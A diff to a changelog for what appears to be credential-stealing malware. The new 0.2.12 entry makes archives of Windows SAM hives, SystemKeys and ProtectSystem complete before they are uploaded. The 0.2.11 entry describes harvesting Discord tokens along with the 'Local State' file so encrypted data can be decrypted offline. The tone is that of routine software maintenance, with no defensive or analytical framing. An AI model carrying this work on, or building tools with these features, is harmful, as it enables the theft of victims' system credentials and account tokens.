@@ -1,5 +1,10 @@
 # Changelog
 
+## 0.2.12
+
+- Hives no longer ship a partial ZIP: `SAM.hiv` and the `SystemKeys` folder get placeholders before `tar`, which aborts at the first missing member (that is why 0.2.11 archives silently lost `ProtectSystem`/`SystemKeys`).
+- The hives result is only accepted when the ZIP really contains `SAM.hiv` and at least one `SystemKeys/` entry, so a partial archive is retried instead of uploaded.
+
 ## 0.2.11
 
 - Discord harvest: the validated `cache/discord/token.txt` is included even if Discord's LevelDB no longer re-reads, and the sibling `Local State` is always part of the raw fallback so v10 blobs stay decryptable offline.
